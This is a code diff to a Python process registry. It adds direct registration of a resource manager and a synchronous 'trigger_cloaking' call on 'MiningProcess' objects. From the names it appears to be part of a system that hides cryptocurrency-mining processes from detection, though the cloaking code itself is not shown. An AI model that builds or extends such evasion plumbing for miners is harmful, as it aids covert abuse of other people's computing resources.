@@ -366,6 +366,10 @@ class DirectPIDRegistry:
             'notifications_sent': 0
         }
         
+        # **SOLUTION 1: Direct ResourceManager Reference** (tham chiếu ResourceManager trực tiếp)
+        self._resource_manager = None  # Will be set via register_resource_manager()
+        self._resource_manager_lock = threading.Lock()
+        
         logger.info("🏗️ DirectPIDRegistry initialized with thread-safe operations")
         self._start_cleanup_thread()
     
@@ -416,6 +420,42 @@ class DirectPIDRegistry:
                     return False
         except Exception as e:
             logger.error(f"❌ Failed to unregister observer: {e}")
+            return False
+    
+    def register_resource_manager(self, rm_instance) -> bool:
+        """
+        **SOLUTION 1: Register ResourceManager Instance** (đăng ký instance ResourceManager)
+        
+        Explicit registration của ResourceManager instance để đảm bảo direct handoff.
+        Giải quyết vấn đề singleton discovery failure.
+        
+        Args:
+            rm_instance: ResourceManager instance to register
+            
+        Returns:
+            bool: True nếu đăng ký thành công
+        """
+        try:
+            with self._resource_manager_lock:
+                if self._resource_manager is not None:
+                    logger.warning(f"⚠️ [SOLUTION-1] ResourceManager already registered, replacing with new instance")
+                
+                self._resource_manager = rm_instance
+                logger.info(f"✅ [SOLUTION-1] ResourceManager registered successfully: {rm_instance.__class__.__name__}")
+                
+                # **Verify ResourceManager has required methods** (xác thực ResourceManager có các phương thức cần thiết)
+                required_methods = ['receive_from_registry', 'trigger_cloaking']
+                missing_methods = [m for m in required_methods if not hasattr(rm_instance, m)]
+                
+                if missing_methods:
+                    logger.warning(f"⚠️ [SOLUTION-1] ResourceManager missing methods: {missing_methods}")
+                    return False
+                
+                logger.info(f"✅ [SOLUTION-1] ResourceManager validated with all required methods")
+                return True
+                
+        except Exception as e:
+            logger.error(f"❌ [SOLUTION-1] Failed to register ResourceManager: {e}")
             return False
     
     def receive_from_coordinator(self, pid: int, coordinator_metadata: Dict[str, Any]) -> bool:
@@ -740,11 +780,11 @@ class DirectPIDRegistry:
         """
         **Execute ResourceManager Handoff** (thực thi handoff ResourceManager)
         
-        Extracted handoff execution logic với comprehensive error handling.
+        SOLUTION 2: Enhanced với direct synchronous cloaking trigger.
         
         Args:
             pid: Process ID
-            rm_instance: ResourceManager instance
+            rm_instance: ResourceManager instance (có thể None nếu sử dụng registered instance)
             coordinator_metadata: Metadata từ coordinator
             process_info: ProcessInfo object
             attempt_number: Current attempt number for logging
@@ -755,6 +795,20 @@ class DirectPIDRegistry:
         try:
             handoff_start_time = time.time()
             logger.info(f"🎯 [RM-HANDOFF] Executing handoff for PID {pid} (attempt {attempt_number})")
+            
+            # **SOLUTION 1 & 2: Use registered ResourceManager if available** (sử dụng ResourceManager đã đăng ký nếu có)
+            with self._resource_manager_lock:
+                if self._resource_manager is not None:
+                    logger.info(f"✅ [SOLUTION-1/2] Using registered ResourceManager instance")
+                    rm_instance = self._resource_manager
+                elif rm_instance is None:
+                    logger.warning(f"⚠️ [SOLUTION-1/2] No ResourceManager available (neither registered nor passed)")
+                    # Try fallback với import trực tiếp
+                    rm_instance = self._try_get_resource_manager()
+            
+            if rm_instance is None:
+                logger.error(f"❌ [SOLUTION-1/2] Cannot execute handoff - No ResourceManager available for PID {pid}")
+                return False
             
             # **Enhanced metadata for ResourceManager** (metadata nâng cao cho ResourceManager)
             additional_metadata = {
@@ -774,39 +828,65 @@ class DirectPIDRegistry:
             # **Use common helper for metadata building** (sử dụng helper chung cho xây dựng metadata)
             rm_metadata = _build_enhanced_metadata(coordinator_metadata, additional_metadata)
             
-            # **TIER 2 FIX: Enhanced ResourceManager receive method call** (gọi phương thức receive của ResourceManager nâng cao)
+            # **SOLUTION 2: Direct synchronous cloaking trigger** (kích hoạt cloaking đồng bộ trực tiếp)
+            if hasattr(rm_instance, 'trigger_cloaking'):
+                logger.info(f"🎯 [SOLUTION-2] Direct trigger_cloaking call for PID {pid}")
+                
+                # **Create MiningProcess object for trigger_cloaking** (tạo đối tượng MiningProcess cho trigger_cloaking)
+                try:
+                    # Import MiningProcess class
+                    from mining_environment.scripts.resource_manager import MiningProcess
+                    
+                    mining_process = MiningProcess(
+                        pid=pid,
+                        name=process_info.process_name,
+                        cmd=rm_metadata.get('cmd', [])
+                    )
+                    
+                    # **SOLUTION 2: Direct synchronous call** (gọi đồng bộ trực tiếp)
+                    rm_instance.trigger_cloaking(mining_process, 'direct_registry_sync')
+                    logger.info(f"✅ [SOLUTION-2] Direct trigger_cloaking completed for PID {pid}")
+                    
+                except ImportError as ie:
+                    logger.warning(f"⚠️ [SOLUTION-2] Cannot import MiningProcess: {ie}")
+                    # Fallback to receive_from_registry method
+                except Exception as trigger_error:
+                    logger.error(f"❌ [SOLUTION-2] Direct trigger_cloaking failed: {trigger_error}")
+            
+            # **Original flow with receive_from_registry** (luồng gốc với receive_from_registry)
             if hasattr(rm_instance, 'receive_from_registry'):
                 logger.info(f"🎯 [TIER-2] Calling receive_from_registry for PID {pid} (attempt {attempt_number})")
                 
-                # **TIER 2 FIX: Validate ResourceManager state before call** (xác thực trạng thái ResourceManager trước khi gọi)
+                # **Validate ResourceManager state** (xác thực trạng thái ResourceManager)
                 if hasattr(rm_instance, 'shared_resource_manager') and rm_instance.shared_resource_manager is None:
-                    logger.error(f"❌ [TIER-2] ResourceManager has no SharedResourceManager - handoff will likely fail for PID {pid}")
+                    logger.warning(f"⚠️ [TIER-2] ResourceManager has no SharedResourceManager - attempting to proceed anyway")
                     
                 try:
                     success = rm_instance.receive_from_registry(pid, rm_metadata)
                     
                     handoff_duration = time.time() - handoff_start_time
                     
-                    # **TIER 2 FIX: Enhanced standardized logging** (logging chuẩn hóa nâng cao)
+                    # **Enhanced standardized logging** (logging chuẩn hóa nâng cao)
                     _log_operation_result('rm-handoff', success, {
                         'pid': pid, 
                         'duration': handoff_duration, 
                         'attempt': attempt_number,
                         'method': 'receive_from_registry',
+                        'solution_used': 'SOLUTION-1/2',
                         'rm_shared_manager_status': rm_instance.shared_resource_manager is not None if hasattr(rm_instance, 'shared_resource_manager') else 'unknown'
                     })
                     
                     if success:
-                        logger.info(f"✅ [TIER-2] ResourceManager handoff successful for PID {pid}")
+                        logger.info(f"✅ [SOLUTION-1/2] ResourceManager handoff successful for PID {pid}")
                         # **Notify observers** (thông báo observers)
                         self._notify_observers(process_info)
                         return True
                     else:
-                        logger.error(f"❌ [TIER-2] ResourceManager handoff failed for PID {pid} - receive_from_registry returned False")
+                        logger.error(f"❌ [SOLUTION-1/2] ResourceManager handoff failed for PID {pid} - receive_from_registry returned False")
                         return False
                         
                 except Exception as receive_error:
-                    logger.error(f"❌ [TIER-2] Exception during receive_from_registry for PID {pid}: {receive_error}")
+                    logger.error(f"❌ [SOLUTION-1/2] Exception during receive_from_registry for PID {pid}: {receive_error}")
                     handoff_duration = time.time() - handoff_start_time
                     
                     # **Log exception details** (ghi log chi tiết exception)
